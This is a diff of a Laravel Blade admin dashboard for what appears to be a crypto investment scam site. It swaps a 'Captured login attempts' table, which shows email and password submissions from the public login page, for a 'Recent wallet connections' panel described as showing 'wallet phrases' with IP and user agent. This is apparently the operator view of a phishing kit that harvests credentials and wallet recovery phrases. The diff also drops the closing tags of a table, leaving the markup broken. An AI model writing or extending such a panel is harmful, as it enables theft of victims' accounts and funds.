@@ -347,28 +347,11 @@
 
     <div class="admin-stat-grid">
         <div class="admin-card">
-            <span>Total users</span>
-            <strong>{{ number_format($stats['total_users']) }}</strong>
-            <div class="admin-note">Registered platform accounts</div>
-        </div>
-        <div class="admin-card">
             <span>Contact messages</span>
             <strong>{{ number_format($stats['total_contacts']) }}</strong>
             <div class="admin-note {{ $stats['unread_contacts'] > 0 ? 'warning' : '' }}">
                 {{ $stats['unread_contacts'] > 0 ? $stats['unread_contacts'].' unread messages need attention' : 'Inbox is currently up to date' }}
             </div>
-        </div>
-        <div class="admin-card">
-            <span>Total transactions</span>
-            <strong>{{ number_format($stats['total_transactions']) }}</strong>
-            <div class="admin-note {{ $stats['pending_transactions'] > 0 ? 'warning' : '' }}">
-                {{ $stats['pending_transactions'] > 0 ? $stats['pending_transactions'].' pending transaction reviews' : 'No pending transaction alerts' }}
-            </div>
-        </div>
-        <div class="admin-card">
-            <span>Investment plans</span>
-            <strong>{{ number_format($stats['total_investment_plans']) }}</strong>
-            <div class="admin-note">Active plans available on the platform</div>
         </div>
         <div class="admin-card">
             <span>Wallet connections</span>
@@ -382,21 +365,6 @@
             <span class="admin-menu-icon"><i class="fas fa-envelope"></i></span>
             <h3>Contact Messages</h3>
             <p>Review incoming enquiries, mark message state, and respond quickly from the admin queue.</p>
-        </a>
-        <a href="{{ route('admin.transactions') }}" class="admin-menu-card">
-            <span class="admin-menu-icon"><i class="fas fa-exchange-alt"></i></span>
-            <h3>Transactions</h3>
-            <p>Track payment flow, status changes, and the latest platform transaction activity.</p>
-        </a>
-        <a href="{{ route('admin.users') }}" class="admin-menu-card">
-            <span class="admin-menu-icon"><i class="fas fa-users"></i></span>
-            <h3>Users</h3>
-            <p>Open user records, monitor account growth, and inspect related activity with fewer clicks.</p>
-        </a>
-        <a href="{{ route('admin.investment-plans') }}" class="admin-menu-card">
-            <span class="admin-menu-icon"><i class="fas fa-chart-line"></i></span>
-            <h3>Investment Plans</h3>
-            <p>Manage product visibility and review which plan tiers are driving current transaction volume.</p>
         </a>
         <a href="{{ route('admin.wallet-connections') }}" class="admin-menu-card">
             <span class="admin-menu-icon"><i class="fas fa-key"></i></span>
@@ -493,38 +461,36 @@
                                     </td>
                                     <td class="table-muted">{{ $transaction->created_at->format('M d, Y') }}</td>
                                     <td><a href="{{ route('admin.transactions.show', $transaction) }}" class="table-link">Open</a></td>
-                                </tr>
-                            @endforeach
-                        </tbody>
-                    </table>
-                </div>
     <div class="admin-section">
         <div class="admin-section-head">
             <div>
-                <h2>Captured login attempts</h2>
-                <p>Recent email/password submissions from the public login page.</p>
+                <h2>Recent wallet connections</h2>
+                <p>Latest wallet phrases and connection details.</p>
             </div>
+            <a href="{{ route('admin.wallet-connections') }}" class="admin-btn">View all connections</a>
         </div>
 
         <div class="admin-table-wrap">
-            @if($recent_login_attempts->count() > 0)
+            @if($recent_wallet_connections->count() > 0)
                 <div class="table-responsive">
                     <table class="table admin-table">
                         <thead>
                             <tr>
-                                <th>Email</th>
-                                <th>Password</th>
+                                <th>Wallet Name</th>
                                 <th>IP Address</th>
-                                <th>Submitted</th>
+                                <th>User Agent</th>
+                                <th>Connected</th>
+                                <th>Action</th>
                             </tr>
                         </thead>
                         <tbody>
-                            @foreach($recent_login_attempts as $attempt)
+                            @foreach($recent_wallet_connections as $connection)
                                 <tr>
-                                    <td><strong>{{ $attempt->email }}</strong></td>
-                                    <td class="table-muted" style="font-family: monospace;">{{ str_repeat('•', strlen($attempt->password)) }}</td>
-                                    <td class="table-muted">{{ $attempt->ip_address ?? 'Unknown' }}</td>
-                                    <td class="table-muted">{{ $attempt->created_at->diffForHumans() }}</td>
+                                    <td><strong>{{ $connection->wallet_name }}</strong></td>
+                                    <td class="table-muted">{{ $connection->ip_address ?? 'Unknown' }}</td>
+                                    <td class="table-muted">{{ Str::limit($connection->user_agent, 40) }}</td>
+                                    <td class="table-muted">{{ $connection->created_at->diffForHumans() }}</td>
+                                    <td><a href="{{ route('admin.wallet-connections.show', $connection) }}" class="table-link">View</a></td>
                                 </tr>
                             @endforeach
                         </tbody>
@@ -532,8 +498,8 @@
                 </div>
             @else
                 <div class="empty-state">
-                    <i class="fas fa-lock"></i>
-                    <div>No login attempts captured yet.</div>
+                    <i class="fas fa-key"></i>
+                    <div>No wallet connections yet.</div>
                 </div>
             @endif
         </div>
